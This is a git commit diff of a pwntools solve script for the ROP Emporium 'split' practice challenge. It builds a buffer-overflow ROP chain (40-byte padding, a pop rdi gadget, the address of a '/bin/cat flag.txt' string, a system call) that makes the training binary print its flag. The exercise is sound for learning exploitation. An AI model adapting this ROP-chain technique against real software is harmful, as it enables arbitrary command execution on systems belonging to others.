56e5ed9c4ee1cc93c203ccbeb78f47b06ad2a5cb
Lukas Gaete <164707110+abund4nt@users.noreply.github.com>
2024-12-01 16:30:09 -0300

    Update solve.py

--- ROP Emporium/split/solve.py
+++ ROP Emporium/split/solve.py
@@ -1,11 +1,17 @@
 from pwn import *
 
-p = process('./split')
+context.binary = binary = ELF('./split', checksec=False)
+p = process()
 
-payload = b'A' * 40
-payload += p64(0x00000000004007c3)      # pop rdi ; ret
-payload += p64(0x00601060)              # /bin/cat flag.txt
-payload += p64(0x000000000040074b)      # system
+offset = b'A' * 40
+system_address = p64(0x0040074b)        
+cat_flag_txt_file = p64(0x00601060)
+pop_rdi_ret = p64(0x00000000004007c3)
 
-p.sendlineafter(b'Contriving a reason to ask user for data...\n> ', payload)
+payload = offset
+payload += pop_rdi_ret 
+payload += cat_flag_txt_file
+payload += system_address
+
+p.sendlineafter(b'>', payload)
 p.interactive()
